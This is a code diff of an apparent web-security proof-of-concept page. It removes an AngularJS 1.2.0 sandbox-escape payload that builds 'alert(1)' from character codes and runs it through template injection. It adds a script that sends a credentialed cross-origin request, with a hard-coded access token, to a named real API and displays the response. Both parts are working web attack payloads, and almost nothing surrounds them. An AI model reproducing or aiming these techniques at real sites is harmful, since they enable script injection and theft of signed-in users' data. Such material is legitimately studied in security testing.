@@ -1,46 +1,19 @@
-<html>
-<head>
-<meta charset="utf-8">
-<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.js"></script>
-</head>
-<body>
-<!--
-    'a'.constructor.prototype.charAt=[].join;
-    $eval('x=alert(1)')
+<script>
+var x = new XMLHttpRequest();
 
-    '' => ([]+[])
-    or '' => [].toString()
-    'foobar' + ([]+[]).constructor.fromCharCode(120,61)...
+  x.onreadystatechange = function() {
+    if (x.readyState == XMLHttpRequest.DONE) {
+      alert(x.response);
+    }
+  }
 
-({}.toString()).constructor.prototype.charAt=[].join;
- $eval(({}.toString()).constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41))
+function cors(){
+  if(x) {
+    x.open('GET', "https://api.bukalapak.com/products/download?mode=*&product_ids%5B%5D=2xnb8sy&access_token=PbAbTpHcyfCeAOcqFq0O0wOiTUT8I0VktrcuDa2g2iu96w", true);
+    x.withCredentials = true;
+    x.send();
+  }
+}
 
-x=toString();
-x=x.split([]);
-x+''
-[object Object]
-constructor
--->
-<div ng-app>
-{{
-c=[];
-o=toString();
-t=o.anchor(true);
-f=o.anchor(false);
-c.push(o[5]);
-c.push(o[1]);
-c.push(t[3]);
-c.push(f[12]);
-c.push(t[9]);
-c.push(t[10]);
-c.push(t[11]);
-c.push(o[5]);
-c.push(t[9]);
-c.push(o[1]);
-c.push(t[10]);
-a=c.join([]);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[c.join([])].fromCharCode(97,108,101,114,116,40,49,41))()
-
-}}
-</div>
-</body>
-</html>
+cors();
+</script>
